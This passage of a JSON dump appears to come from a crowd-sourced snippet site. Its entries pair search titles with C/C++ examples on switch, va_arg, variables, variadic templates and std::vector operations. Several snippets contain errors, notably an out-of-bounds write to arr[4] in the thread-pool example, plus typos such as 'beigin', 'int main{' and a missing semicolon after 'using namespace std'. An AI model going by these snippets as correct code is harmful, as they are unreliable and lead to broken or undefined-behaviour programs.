    "description": "x = y = z = 5;\n",
    "reg_date": "2021-10-12T11:44:10.000Z"
  },
  {
    "id": 4136,
    "keyword": null,
    "link": null,
    "title": " using switch case in c",
    "description": "switch (n) {     case 1: // code to be executed if n = 1;         break;     case 2: // code to be executed if n = 2;         break;     default: // code to be executed if n doesn't match any cases }\n",
    "reg_date": "2021-10-12T11:44:10.000Z"
  },
  {
    "id": 4137,
    "keyword": null,
    "link": null,
    "title": " va arg",
    "description": "/* va_arg example */ #include <stdio.h>      /* printf */ #include <stdarg.h>     /* va_list, va_start, va_arg, va_end */  int FindMax (int n, ...) {   int i,val,largest;   va_list vl;   va_start(vl,n);   largest=va_arg(vl,int);   for (i=1;i<n;i++)   {     val=va_arg(vl,int);     largest=(largest>val)?largest:val;   }   va_end(vl);   return largest; }  int main () {   int m;   m= FindMax (7,702,422,631,834,892,104,772);   printf (\"The largest value is: %d\\n\",m);   return 0; }   // Output: // The largest value is: 892\n",
    "reg_date": "2021-10-12T11:44:10.000Z"
  },
  {
    "id": 4138,
    "keyword": null,
    "link": null,
    "title": " va list to printf",
    "description": "/* vprintf example */ #include <stdio.h> #include <stdarg.h>  void WriteFormatted ( const char * format, ... ) {   va_list args;   va_start (args, format);   vprintf (format, args);   va_end (args); }  int main () {    WriteFormatted (\"Call with %d variable argument.\\n\",1);    WriteFormatted (\"Call with %d variable %s.\\n\",2,\"arguments\");     return 0; }\n",
    "reg_date": "2021-10-12T11:44:10.000Z"
  },
  {
    "id": 4139,
    "keyword": null,
    "link": null,
    "title": " variabili in c++",
    "description": "// sintassi per la dichiarazione e definizione di una variabile <tipo> <identificatore> = <valore>; // esempi di dichiarazione e definizione int x = -1; bool flag = false;\n",
    "reg_date": "2021-10-12T11:44:11.000Z"
  },
  {
    "id": 4140,
    "keyword": null,
    "link": null,
    "title": " variable sized array",
    "description": "#include <cmath> #include <cstdio> #include <vector> #include <iostream> #include <algorithm> //using namespace std;   int main() {     /* Enter your code here. Read input from STDIN. Print output to STDOUT */        int n;                                  //number of Arrays     int q;                                  //number of Queries     int tempValue;                          //would be used to store the input value of each element in inner vector          //storing the number of arrays in 'n' and number of queries in 'q'     std::cin >> n >> q;                              ////////////////////////     /*creation of vectors*/     //////////////////////          //creating 'n' number of vector<int>     std::vector<std::vector<int>> a(n);           int numberOfElements;                    //number of elements in each inner vector     //for each vector     for(int i = 0; i < n; i++){         //store the number of elements desired         std::cin >> numberOfElements;         //runs 'numberOfElements times         for(int j = 0; j < numberOfElements; j++){             std::cin >> tempValue;             a[i].push_back(tempValue);         }     }          ///////////////////////     /*queries of vectors*/     /////////////////////          int outVector;                          //stores the queried outer vector index     int inVector;                           //stores the queried inner vector index     //runs 'q' times     for(int i = 0; i < q; i++){         std::cin >> outVector >> inVector;         std::cout << a[outVector][inVector];         std::cout << std::endl;     }        return 0; } \n",
    "reg_date": "2021-10-12T11:44:11.000Z"
  },
  {
    "id": 4141,
    "keyword": null,
    "link": null,
    "title": " variable sized arrays hackerrank",
    "description": "#include <iostream> #include <vector>  using namespace std;  int main() { \t// get length of array 'a' and number of queries \tint n, q; \tcin >> n >> q;  \t// create vector of vectors \tvector<vector<int>> a(n);  \t// fill each 2D vector i with k_i values \tfor (int i = 0; i < n; i++) { \t\t// get the length k of the vector at a[i] \t\tint k; \t\tcin >> k;  \t\t// fill the vector with k values \t\ta[i].resize(k); \t\tfor (int j = 0; j < k; j++) { \t\t\tcin >> a[i][j]; \t\t} \t}  \t// run queries on a \tfor (int q_num = 0; q_num < q; q_num++) { \t\t// get i, j as the 'query' to get a value from a \t\tint i, j; \t\tcin >> i >> j; \t\tcout << a[i][j] << endl; \t}  \treturn 0; }\nint n,q; cin >> n >> q; vector< vector<int> > a(n);  // input each array for (int i=0;i<n;i++) {     int k;     cin >> k;      for (int j=0;j<k;j++) {         int data;         cin >> data;         a[i].push_back(data);     } }  // do the queries for (int i=0;i<q;i++) {     int x,y;     cin >> x >> y;     cout << a[x][y] << endl; } \n",
    "reg_date": "2021-10-12T11:44:11.000Z"
  },
  {
    "id": 4142,
    "keyword": null,
    "link": null,
    "title": " variable sized arrays hackerrank solution in c++",
    "description": "#include <iostream> #include <vector>  using namespace std;  int main() { \t// get length of array 'a' and number of queries \tint n, q; \tcin >> n >> q;  \t// create vector of vectors \tvector<vector<int>> a(n);  \t// fill each 2D vector i with k_i values \tfor (int i = 0; i < n; i++) { \t\t// get the length k of the vector at a[i] \t\tint k; \t\tcin >> k;  \t\t// fill the vector with k values \t\ta[i].resize(k); \t\tfor (int j = 0; j < k; j++) { \t\t\tcin >> a[i][j]; \t\t} \t}  \t// run queries on a \tfor (int q_num = 0; q_num < q; q_num++) { \t\t// get i, j as the 'query' to get a value from a \t\tint i, j; \t\tcin >> i >> j; \t\tcout << a[i][j] << endl; \t}  \treturn 0; }\nint n,q; cin >> n >> q; vector< vector<int> > a(n);  // input each array for (int i=0;i<n;i++) {     int k;     cin >> k;      for (int j=0;j<k;j++) {         int data;         cin >> data;         a[i].push_back(data);     } }  // do the queries for (int i=0;i<q;i++) {     int x,y;     cin >> x >> y;     cout << a[x][y] << endl; } \n",
    "reg_date": "2021-10-12T11:44:11.000Z"
  },
  {
    "id": 4143,
    "keyword": null,
    "link": null,
    "title": " variable vs pointer in c++",
    "description": "// Variable is used to store value int a = 5; cout << a; //output is 5  // Pointer is used to store address of variable int a = 5; int *ab; ab = &a; //& is used get address of the variable cout << ab; // Output is address of variable\n",
    "reg_date": "2021-10-12T11:44:11.000Z"
  },
  {
    "id": 4144,
    "keyword": null,
    "link": null,
    "title": " variables",
    "description": "1-GLOBAL variables allow you to access data between collections, requests, test scripts, and environments. Global variables are available throughout a workspace.  2-COLLECTION Only accessible within the same collection and can not be accessed anywhere else COLLECTION variables are available throughout  the requests in a collection and are independent of environments, so do not change based on the selected environment. I use collection variables when I use single environment like url details. We can refer to the variable by using {{}}(double curly brace) and  it can be used anywhere  3-ENVIRONMENT Variable , a variable that accessible only when the environment is active   Usually used for an app with multiple environment , we can use env variable to store variable with same name and different value to store environment specific data   for example :   xxxNamed app has 3 environments with different URL and Crendentials   But all endpoints are exactly the same no matter what environment you work on   so we can create 3 environment called  QA1 , QA2 , QA3 and run same set of request  by selecting different environment.  Only one environment can be active at a time.   4-LOCAL variables are temporary, and only accessible in your request scripts.  Local variable values are scoped to a  single request or collection run, and are no longer available when the run is complete.   5-DATA variables come from external CSV and JSON files to define data sets you can use when running collections via the Collection Runner.\nyes = 5 print(yes)\n<?php /* In PHP, a variable starts with the $ sign,  followed by the name of the variable: */  $txt = \"Hello world!\"; $x = 5; $y = 10.5; ?>\n//You can make a variable by using: var variable-name = 'defenition of the variable'; // Or you can use let variable-name = 'defenition of the variable';\nvar something = something;\n// initialization of variables  #include <iostream> using namespace std;  int main () {   int a=5;               // initial value: 5   int b(3);              // initial value: 3   int c{2};              // initial value: 2   int result;            // initial value undetermined    a = a + b;   result = a - c;   cout << result;    return 0; }\n",
    "reg_date": "2021-10-12T11:44:11.000Z"
  },
  {
    "id": 4145,
    "keyword": null,
    "link": null,
    "title": " variables in c++",
    "description": "std::string str = \"text\";\t// stores a string int    foo = 3;\t\t\t\t// stores any integer float  bar = 3.14;\t\t\t// stores 32 bit number double baz = 3.14159265;\t// stores 64 bit number\n#include <iostream> using namespace std; int main(){ \t int number = 1;               double decimal = 6.9;     char characterx = 'i';    string text =\"Sup\";      bool boolean = true;        return 0; }\n#include <iostream>  using namespace std    int main{ \tint x = 3;     float g = 4.0;     long h = 1234567;     double j = 1237886.099;     cout<<x<<endl;     cout<<h<<endl;     cout<<g<<endl;     cout<<j<<endl; }\n#include <iostream> using namespace std;  int main() { // To define variables in C++, you have to specify the data type. Example: int number = 10; // Declares a variable with the integer data type. float decimal = 3.5;  // Declares a variable with the float data type. double decimalNum = 3.3333; // Doubles are used for more specific points in floats. string text = \"Hello World\";  // Declares a variable with the string data type. bool result = true;  // Declares a variable with the boolean data type.    }\nCreate a variable called myNum of type int and assign it the value 15:   int myNum = 15; cout << myNum; \n",
    "reg_date": "2021-10-12T11:44:11.000Z"
  },
  {
    "id": 4146,
    "keyword": null,
    "link": null,
    "title": " variabvles in c++",
    "description": "#include <iostream>  using namespace std    int main{ \tint x = 3;     float g = 4.0;     long h = 1234567;     double j = 1237886.099;     cout<<x<<endl;     cout<<h<<endl;     cout<<g<<endl;     cout<<j<<endl; }\n",
    "reg_date": "2021-10-12T11:44:11.000Z"
  },
  {
    "id": 4147,
    "keyword": null,
    "link": null,
    "title": " variadic template constructor matches better than copy constructor",
    "description": "// C++11 way template <typename... > struct typelist;  template <typename... Args, \t\t  \ttypename = typename std::enable_if<           \t\t!std::is_same<typelist<Bar>,                 \t\t\t  typelist<typename std::decay<Args>::type...>                 >::value             >::type          > Bar(Args&&... args) { } \n",
    "reg_date": "2021-10-12T11:44:11.000Z"
  },
  {
    "id": 4148,
    "keyword": null,
    "link": null,
    "title": " variadic templates",
    "description": "template<class... Args> void Foo(Agrs*... arguments);  template<class... Args> class A;  /* Variadic templates can be used to allow a multitude of variations of a class or function to be compiled without having to explicitly state what the required amount of template parameters are.  In order to use the parameter pack you need to unpack it. This can be done through C++17 fold expressions or using recursion:*/  template<typename Arg> void Foo(Arg* arg) {   // do something. }  template<typename Arg, typename... Args> void Foo(Arg* arg, Args*... args) {   Foo(arg);   Foo(args); }\n",
    "reg_date": "2021-10-12T11:44:12.000Z"
  },
  {
    "id": 4149,
    "keyword": null,
    "link": null,
    "title": " variant hold type",
    "description": "template<typename T, typename VARIANT_T> struct variant_member;  template<typename T, typename... ALL_T> struct variant_member<T, std::variant<ALL_T...>>    : public std::disjunction<std::is_same<T, ALL_T>...> {};    // Using as: variant_member<TYPE, VARIANT>::value\n",
    "reg_date": "2021-10-12T11:44:12.000Z"
  },
  {
    "id": 4150,
    "keyword": null,
    "link": null,
    "title": " varint index",
    "description": "template <typename> struct tag { };  template <typename T, typename V> struct variant_index;  template <typename T, typename... Ts>  struct variant_index<T, std::variant<Ts...>>     : std::integral_constant<size_t, std::variant<tag<Ts>...>(tag<T>()).index()> { };  // Use as: variant_index<TYPE, VARIANT>::value\n",
    "reg_date": "2021-10-12T11:44:12.000Z"
  },
  {
    "id": 4151,
    "keyword": null,
    "link": null,
    "title": " vbs check if file exists",
    "description": "Public Function IsFile(s)     IsFile = CreateObject(\"Scripting.FileSystemObject\").FileExists(s) End Function\nDim FSO Set FSO = CreateObject(\"Scripting.FileSystemObject\")  If fso.FileExists(\"C:\\myFolder\\newFile.txt\") Then     'Perform Code End If \n",
    "reg_date": "2021-10-12T11:44:12.000Z"
  },
  {
    "id": 4152,
    "keyword": null,
    "link": null,
    "title": " vector::erase()",
    "description": "1. vectorname.erase(position) 2. vectorname.erase(startingposition, endingposition) Parameters : Position of the element to be removed in the form of iterator. or the range specified using start and end iterator. Result : Elements are removed from the specified position of the container.\n",
    "reg_date": "2021-10-12T11:44:12.000Z"
  },
  {
    "id": 4153,
    "keyword": null,
    "link": null,
    "title": " vector.find()",
    "description": "#include <algorithm> #include <vector>  if ( std::find(vec.begin(), vec.end(), item) != vec.end() )    do_this(); else    do_that();\n",
    "reg_date": "2021-10-12T11:44:12.000Z"
  },
  {
    "id": 4154,
    "keyword": null,
    "link": null,
    "title": " vector Swap",
    "description": "std::iter_swap(arr.begin()+pos1,arr.begin()+pos2);\nvector<T>().swap(x);   // clear x reallocating \n#include <iostream> #include <vector>   template<class Os, class Co> Os& operator<<(Os& os, const Co& co) {     os << \"{\";     for (auto const& i : co) { os << ' ' << i; }     return os << \" } \"; }   int main() {     std::vector<int> a1{1, 2, 3}, a2{4, 5};       auto it1 = std::next(a1.begin());     auto it2 = std::next(a2.begin());       int& ref1 = a1.front();     int& ref2 = a2.front();       std::cout << a1 << a2 << *it1 << ' ' << *it2 << ' ' << ref1 << ' ' << ref2 << '\\n';     a1.swap(a2);     std::cout << a1 << a2 << *it1 << ' ' << *it2 << ' ' << ref1 << ' ' << ref2 << '\\n';       // Note that after swap the iterators and references stay associated with their     // original elements, e.g. it1 that pointed to an element in 'a1' with value 2     // still points to the same element, though this element was moved into 'a2'. }\n// clearing vectors #include <iostream> #include <vector>  int main () {   std::vector<int> myvector;   myvector.push_back (100);   myvector.push_back (200);   myvector.push_back (300);    std::cout << \"myvector contains:\";   for (unsigned i=0; i<myvector.size(); i++)     std::cout << ' ' << myvector[i];   std::cout << '\\n';    myvector.clear();   myvector.push_back (1101);   myvector.push_back (2202);    std::cout << \"myvector contains:\";   for (unsigned i=0; i<myvector.size(); i++)     std::cout << ' ' << myvector[i];   std::cout << '\\n';    return 0; }\nvector1.swap<vector2>; //time complexity: O(1)\n",
    "reg_date": "2021-10-12T11:44:12.000Z"
  },
  {
    "id": 4155,
    "keyword": null,
    "link": null,
    "title": " vector assign",
    "description": "#include <set> #include <vector>  std::vector<int> some_vector(some_set.begin(), some_set.end());\n#include <iostream> #include <vector>  using namespace std;  int main() {     int arr[] = {1, 2, 3, 4, 7};     vector<int> v1;     vector<int> v2;     v1.assign(arr, arr+5);     v2.assign(arr, arr+2);      //printing values of v1     cout << \"elements of v1\" << endl;     for(int i = 0; i < v1.size(); i++)     {         cout << v1[i] << endl;     }      //printing values of v2     cout << \"elements of v2\" << endl;     for(int i = 0; i < v2.size(); i++)     {         cout << v2[i] << endl;     }     return 0; } \n",
    "reg_date": "2021-10-12T11:44:12.000Z"
  },
  {
    "id": 4156,
    "keyword": null,
    "link": null,
    "title": " vector by index c++",
    "description": "// vector::operator[] #include <iostream> #include <vector>  int main () {   std::vector<int> myvector (10);   // 10 zero-initialized elements    std::vector<int>::size_type sz = myvector.size();    // assign some values:   for (unsigned i=0; i<sz; i++) myvector[i]=i;    // reverse vector using operator[]:   for (unsigned i=0; i<sz/2; i++)   {     int temp;     temp = myvector[sz-1-i];     myvector[sz-1-i]=myvector[i];     myvector[i]=temp;   }    std::cout << \"myvector contains:\";   for (unsigned i=0; i<sz; i++)     std::cout << ' ' << myvector[i];   std::cout << '\\n';    return 0; }\n",
    "reg_date": "2021-10-12T11:44:12.000Z"
  },
  {
    "id": 4157,
    "keyword": null,
    "link": null,
    "title": " vector c++",
    "description": "// CPP program to create an empty vector  // and push values one by one.  #include <vector>  using namespace std; int main()  {      // Create an empty vector      vector<int> vect;       //add/push an integer to the end of the vector     vect.push_back(10);  \t//to traverse and print the vector from start to finish     for (int x : vect)          cout << x << \" \";      return 0;  }\n// First include the vector library: #include <vector>  // The syntax to create a vector looks like this: std::vector<type> name;  // We can create & initialize \"lol\" vector with specific values: std::vector<double> lol = {66.666, -420.69};  // it would look like this: 66.666 | -420.69\n#include <vector>  int main() {   std::vector<int> v;   v.push_back(10); // v = [10];   v.push_back(20); // v = [10, 20];      v.pop_back(); // v = [10];   v.push_back(30); // v = [10, 30];      auto it = v.begin();   int x = *it; // x = 10;   ++it;   int y = *it; // y = 30   ++it;   bool is_end = it == v.end(); // is_end = true      return 0; }\n#include <iostream> #include <vector>   #define M 3 #define N 4   int main() {   // specify default value to fill the vector elements   int default_value = 1;   // first initialize a vector of ints with given default value   std::vector<int> v(N, default_value);   // Use above vector to initialize the two-dimensional vector   std::vector<std::vector<int>> matrix(M, v);      return 0; } \nvector_name.push_back(element_to_be_added);\nVectors are sequence container that can change size. Container is a objects  that hold data of same type. Sequence containers store elements strictly in  linear sequence.  Vector stores elements in contiguous memory locations and enables direct access to any element using subscript operator []. Unlike array, vector can shrink or expand as needed at run time. The storage of the vector is handled automatically.  To support shrink and expand functionality at runtime, vector container may  allocate some extra storage to accommodate for possible growth thus container have actual capacity greater than the size. Therefore, compared to array, vector consumes more memory in exchange for the ability to manage storage and grow  dynamically in an efficient way.  Zero sized vectors are also valid. In that case vector.begin() and vector.end() points to same location. But behavior of calling front() or back() is undefined.\n",
    "reg_date": "2021-10-12T11:44:12.000Z"
  },
  {
    "id": 4158,
    "keyword": null,
    "link": null,
    "title": " vector concat c++",
    "description": "vector1.insert( vector1.end(), vector2.begin(), vector2.end() );\n",
    "reg_date": "2021-10-12T11:44:13.000Z"
  },
  {
    "id": 4159,
    "keyword": null,
    "link": null,
    "title": " vector erase",
    "description": "// Deletes the second element (vec[1]) vec.erase(vec.begin() + 1);  // Deletes the second through third elements (vec[1], vec[2]) vec.erase(vec.begin() + 1, vec.begin() + 3);\n#include <algorithm> #include <vector>  // using the erase-remove idiom  std::vector<int> vec {2, 4, 6, 8}; int value = 8 // value to be removed vec.erase(std::remove(vec.begin(), vec.end(), value), vec.end());\nvector.erase( vector.begin() + 3 ); // Deleting the fourth element\nvector.erase(position) // remove certain position // or vector.erase(left,right) // remove positions within range \n// Why not setup a lambda you can use again & again auto removeByIndex =    []<class T>(std::vector<T> &vec, unsigned int index) { \t// This is the meat & potatoes   \tvec.erase(vec.begin() + index); };  // Then you can throw whatever vector at it you desire std::vector<std::string> stringvec = {\"Hello\", \"World\"}; // Will remove index 1: \"World\" removeByIndex(stringvec, 1); // Vector of integers, we will use push_back std::vector<unsigned int> intvec; intvec.push_back(33); intvec.push_back(66); intvec.push_back(99); // Will remove index 2: 99 removeByIndex(intvec, 2);\nInput  : myvector= {1, 2, 3, 4, 5}, iterator= myvector.begin()+2          myvector.erase(iterator); Output : 1, 2, 4, 5  Input  : myvector= {1, 2, 3, 4, 5, 6, 7, 8}, iterator1= myvector.begin()+3, iterator2= myvector.begin()+6          myvector.erase(iterator1, iterator2); Output : 1, 2, 3, 7, 8\n",
    "reg_date": "2021-10-12T11:44:13.000Z"
  },
  {
    "id": 4160,
    "keyword": null,
    "link": null,
    "title": " vector erase not working c++",
    "description": "for (int i = 0; i < numbers.size(); i++){     if (numbers[i] == 1){         numbers.erase(numbers.begin() + i);         i--;     } }\n",
    "reg_date": "2021-10-12T11:44:13.000Z"
  },
  {
    "id": 4161,
    "keyword": null,
    "link": null,
    "title": " vector erase specific element",
    "description": "vector.erase( vector.begin() + 3 ); // Deleting the fourth element\ntemplate <typename T> void remove(std::vector<T>& vec, size_t pos) {     std::vector<T>::iterator it = vec.begin();     std::advance(it, pos);     vec.erase(it); }\n",
    "reg_date": "2021-10-12T11:44:13.000Z"
  },
  {
    "id": 4162,
    "keyword": null,
    "link": null,
    "title": " vector functions c++",
    "description": "                   /*Member functions*/                  Iterators  -----------------------------------------  begin | Returns an iterator to the beginning  end   | Returns an iterator to the end                     Capacity  -----------------------------------------  empty    | Checks whether the container is empty  size     | Returns the number of elements  reserve  | Reserves storage  capacity | Returns the number of elements that can be held in currently allocated storage                     Element access  -----------------------------------------  at\t     \t| Access specified element with bounds checking  front  \t| Access the first element  back   \t| Access the last element  operator[] | Access specified element                       Modifiers  -----------------------------------------  clear        | Clears the contents  insert       | Inserts elements  emplace      | Constructs element in-place  erase        | Erases elements  push_back    | Adds an element to the end  emplace_back | Constructs an element in-place at the end    pop_back     | Removes the last element          resize       | Changes the number of elements stored       swap         | Swaps the contents      *Notes*   - https://en.cppreference.com/w/cpp/container/vector   - https://www.geeksforgeeks.org/vector-in-cpp-stl/   - https://www.tutorialspoint.com/cpp_standard_library/vector.htm\n#include <vector> std::vector<std::string> x;\nvector<int> g1;         for (int i = 1; i <= 5; i++)          g1.push_back(i);         cout << \"Output of begin and end: \";      for (auto i = g1.begin(); i != g1.end(); ++i)          cout << *i << \" \";         cout << \"\\nOutput of cbegin and cend: \";      for (auto i = g1.cbegin(); i != g1.cend(); ++i)          cout << *i << \" \";         cout << \"\\nOutput of rbegin and rend: \";      for (auto ir = g1.rbegin(); ir != g1.rend(); ++ir)          cout << *ir << \" \";    \ntemplate < class T, class Alloc = allocator<T> > class vector; \n#include <iostream> #include <vector>  class Object { \tpublic: \t\tObject() \t\t{} \t\t~Object() \t\t{} \t\tvoid AddInt(int num) \t\t{ \t\t\tm_VectorOfInts.push_back(num); \t\t} \t\tstd::vector<int> GetCopyOfVector() \t\t{ \t\t\treturn m_VectorOfInts; \t\t} \t\tvoid DisplayVectorContents() \t\t{ \t\t\tfor( unsigned int i = 0; i < m_VectorOfInts.size(); i++ ) \t\t\t{ \t\t\t\tstd::cout << \"Element[\" << i << \"] = \" << m_VectorOfInts[i] << std::endl; \t\t\t} \t\t\tstd::cout << std::endl; \t\t}  \tprivate: \t\tstd::vector<int> m_VectorOfInts; };  int main() { \t// Create our class an add a few ints \tObject obj; \tobj.AddInt(32); \tobj.AddInt(56); \tobj.AddInt(21);  \t// Display the vector contents so far \tobj.DisplayVectorContents();  \t// Creates a copy of the classes container you can only really view whats in  \t// the classes vector container. What ever changes you make here wont effect the class. \tstd::vector<int> container1 = obj.GetCopyOfVector(); \t// These elements wont be added as it's a copy of the container \tcontainer1.push_back(342); \tcontainer1.push_back(64); \tcontainer1.push_back(123);   \t// Display the classes container to see show nothing was added. \tobj.DisplayVectorContents();  \treturn 0; }\n",
    "reg_date": "2021-10-12T11:44:13.000Z"
  },
  {
    "id": 4163,
    "keyword": null,
    "link": null,
    "title": " vector in c++",
    "description": "// CPP program to create an empty vector  // and push values one by one.  #include <vector>  using namespace std; int main()  {      // Create an empty vector      vector<int> vect;       //add/push an integer to the end of the vector     vect.push_back(10);  \t//to traverse and print the vector from start to finish     for (int x : vect)          cout << x << \" \";      return 0;  }\n#include <vector>  int main() {   std::vector<int> v;   v.push_back(10); // v = [10];   v.push_back(20); // v = [10, 20];      v.pop_back(); // v = [10];   v.push_back(30); // v = [10, 30];      auto it = v.begin();   int x = *it; // x = 10;   ++it;   int y = *it; // y = 30   ++it;   bool is_end = it == v.end(); // is_end = true      return 0; }\n#include <vector> #include <string>  int main() {   std::vector<std::string> str_v;   str_v.push_back(\"abc\");   str_v.push_back(\"hello world!!\");   str_v.push_back(\"i'm a coder.\");   for(auto it = str_v.beigin();it != str_v.end(); it++) {   \tprintf(\"%s\\n\",it->c_str());   } }\n#include <vector>  int main() {   std::vector<int> myVector = { 666, 1337, 420 };      size_t size = myVector.size(); // 3      myVector.push_back(399); // Add 399 to the end of the vector      size = myVector.size(); // 4 }\n vector<int> vec; //Creates an empty (size 0) vector    vector<int> vec(4); //Creates a vector with 4 elements.  /*Each element is initialised to zero. If this were a vector of strings, each string would be empty. */  vector<int> vec(4, 42);  /*Creates a vector with 4 elements. Each element is initialised to 42. */   vector<int> vec(4, 42); vector<int> vec2(vec);  /*The second line creates a new vector, copying each element from the vec into vec2. */\nvector<int> g1;         for (int i = 1; i <= 5; i++)          g1.push_back(i);         cout << \"Output of begin and end: \";      for (auto i = g1.begin(); i != g1.end(); ++i)          cout << *i << \" \";         cout << \"\\nOutput of cbegin and cend: \";      for (auto i = g1.cbegin(); i != g1.cend(); ++i)          cout << *i << \" \";         cout << \"\\nOutput of rbegin and rend: \";      for (auto ir = g1.rbegin(); ir != g1.rend(); ++ir)          cout << *ir << \" \";    \n",
    "reg_date": "2021-10-12T11:44:13.000Z"
  },
  {
    "id": 4164,
    "keyword": null,
    "link": null,
    "title": " vector in c++ class",
    "description": "#include <iostream> #include <vector>  class Object { \tpublic: \t\tObject() \t\t{} \t\t~Object() \t\t{} \t\tvoid AddInt(int num) \t\t{ \t\t\tm_VectorOfInts.push_back(num); \t\t} \t\tstd::vector<int> GetCopyOfVector() \t\t{ \t\t\treturn m_VectorOfInts; \t\t} \t\tvoid DisplayVectorContents() \t\t{ \t\t\tfor( unsigned int i = 0; i < m_VectorOfInts.size(); i++ ) \t\t\t{ \t\t\t\tstd::cout << \"Element[\" << i << \"] = \" << m_VectorOfInts[i] << std::endl; \t\t\t} \t\t\tstd::cout << std::endl; \t\t}  \tprivate: \t\tstd::vector<int> m_VectorOfInts; };  int main() { \t// Create our class an add a few ints \tObject obj; \tobj.AddInt(32); \tobj.AddInt(56); \tobj.AddInt(21);  \t// Display the vector contents so far \tobj.DisplayVectorContents();  \t// Creates a copy of the classes container you can only really view whats in  \t// the classes vector container. What ever changes you make here wont effect the class. \tstd::vector<int> container1 = obj.GetCopyOfVector(); \t// These elements wont be added as it's a copy of the container \tcontainer1.push_back(342); \tcontainer1.push_back(64); \tcontainer1.push_back(123);   \t// Display the classes container to see show nothing was added. \tobj.DisplayVectorContents();  \treturn 0; }\n",
    "reg_date": "2021-10-12T11:44:13.000Z"
  },
  {
    "id": 4165,
    "keyword": null,
    "link": null,
    "title": " vector in c",
    "description": "#include <vector> std::vector<std::string> x;\n#include <iostream>  #include <vector>     using namespace std;     int main()  {      vector<int> g1;         for (int i = 1; i <= 5; i++)          g1.push_back(i);         cout << \"Output of begin and end: \";      for (auto i = g1.begin(); i != g1.end(); ++i)          cout << *i << \" \";         cout << \"\\nOutput of cbegin and cend: \";      for (auto i = g1.cbegin(); i != g1.cend(); ++i)          cout << *i << \" \";         cout << \"\\nOutput of rbegin and rend: \";      for (auto ir = g1.rbegin(); ir != g1.rend(); ++ir)          cout << *ir << \" \";         cout << \"\\nOutput of crbegin and crend : \";      for (auto ir = g1.crbegin(); ir != g1.crend(); ++ir)          cout << *ir << \" \";         return 0;  }\n",
    "reg_date": "2021-10-12T11:44:13.000Z"
  },
  {
    "id": 4166,
    "keyword": null,
    "link": null,
    "title": " vector insert",
    "description": "vector<int> a; vector<int> b; // Appending the integers of b to the end of a  a.insert(a.end(), b.begin(), b.end());\n// inserting into a vector #include <iostream> #include <vector>  int main () {   std::vector<int> myvector (3,100);   std::vector<int>::iterator it;    it = myvector.begin();   it = myvector.insert ( it , 200 );    myvector.insert (it,2,300);    // \"it\" no longer valid, get a new one:   it = myvector.begin();    std::vector<int> anothervector (2,400);   myvector.insert (it+2,anothervector.begin(),anothervector.end());    int myarray [] = { 501,502,503 };   myvector.insert (myvector.begin(), myarray, myarray+3);    std::cout << \"myvector contains:\";   for (it=myvector.begin(); it<myvector.end(); it++)     std::cout << ' ' << *it;   std::cout << '\\n';    return 0; }\n#include <iostream> #include <vector>   void print_vec(const std::vector<int>& vec) {     for (auto x: vec) {          std::cout << ' ' << x;     }     std::cout << '\\n'; }   int main () {     std::vector<int> vec(3,100);     print_vec(vec);       auto it = vec.begin();     it = vec.insert(it, 200);     print_vec(vec);       vec.insert(it,2,300);     print_vec(vec);       // \"it\" no longer valid, get a new one:     it = vec.begin();       std::vector<int> vec2(2,400);     vec.insert(it+2, vec2.begin(), vec2.end());     print_vec(vec);       int arr[] = { 501,502,503 };     vec.insert(vec.begin(), arr, arr+3);     print_vec(vec); }\n",
    "reg_date": "2021-10-12T11:44:13.000Z"
  },
  {
    "id": 4167,
    "keyword": null,
    "link": null,
    "title": " vector keyword in c++",
    "description": "template < class T, class Alloc = allocator<T> > class vector; \n",
    "reg_date": "2021-10-12T11:44:14.000Z"
  },
  {
    "id": 4168,
    "keyword": null,
    "link": null,
    "title": " vector last c++",
    "description": "vector<int> v; cout << v[v.size() - 1]; cout << *(v.end() - 1); cout << *v.rbegin(); // all three of them work\n// vector::back #include <iostream> #include <vector>  int main () {   std::vector<int> myvector;    myvector.push_back(10);    while (myvector.back() != 0)   {     myvector.push_back ( myvector.back() -1 );   }    std::cout << \"myvector contains:\";   for (unsigned i=0; i<myvector.size() ; i++)     std::cout << ' ' << myvector[i];   std::cout << '\\n';    return 0; }\nstd::v.back()\n",
    "reg_date": "2021-10-12T11:44:14.000Z"
  },
  {
    "id": 4169,
    "keyword": null,
    "link": null,
    "title": " vector length c++",
    "description": "#include <vector>  int main () {     std::vector<int> v;     auto size = v.size(); }\n#include <vector>  int main() {   std::vector<int> myVector = { 666, 1337, 420 };      size_t size = myVector.size(); // 3      myVector.push_back(399); // Add 399 to the end of the vector      size = myVector.size(); // 4 }\n",
    "reg_date": "2021-10-12T11:44:14.000Z"
  },
  {
    "id": 4170,
    "keyword": null,
    "link": null,
    "title": " vector of int to string c++",
    "description": "#include <vector> // vector  #include <sstream> // string stream  #include <iterator> // ostream_iterator  #include <iostream> // cout  using namespace std;  int main() {     vector<int> nums = {10, 7, 76, 415};     stringstream result;     copy(nums.begin(), nums.end(), std::ostream_iterator<int>(result, \"\"));     string n = result.str();     cout << n; }  \n",
    "reg_date": "2021-10-12T11:44:14.000Z"
  },
  {
    "id": 4171,
    "keyword": null,
    "link": null,
    "title": " vector of pairs declaration in cpp",
    "description": "vector<pair<int,int>>v;\n",
    "reg_date": "2021-10-12T11:44:14.000Z"
  },
  {
    "id": 4172,
    "keyword": null,
    "link": null,
    "title": " vector of strings initialization c++",
    "description": "C++17   std::vector<std::string> v = { \"xyzzy\", \"plugh\", \"abracadabra\" }; std::vector<std::string> v({ \"xyzzy\", \"plugh\", \"abracadabra\" }); std::vector<std::string> v{ \"xyzzy\", \"plugh\", \"abracadabra\" };\n",
    "reg_date": "2021-10-12T11:44:14.000Z"
  },
  {
    "id": 4173,
    "keyword": null,
    "link": null,
    "title": " vector of threads thread pool c++",
    "description": "namespace {   std::vector<std::thread> workers;    int total = 4;   int arr[4] = {0};    void each_thread_does(int i) {     arr[i] += 2;   } }  int main(int argc, char *argv[]) {   for (int i = 0; i < 8; ++i) { // for 8 iterations,     for (int j = 0; j < 4; ++j) {       workers.push_back(std::thread(each_thread_does, j));     }     for (std::thread &t: workers) {       if (t.joinable()) {         t.join();       }     }     arr[4] = std::min_element(arr, arr+4);   }   return 0; } \n",
    "reg_date": "2021-10-12T11:44:14.000Z"
  },
  {
    "id": 4174,
    "keyword": null,
    "link": null,
    "title": " vector of vectors c++",
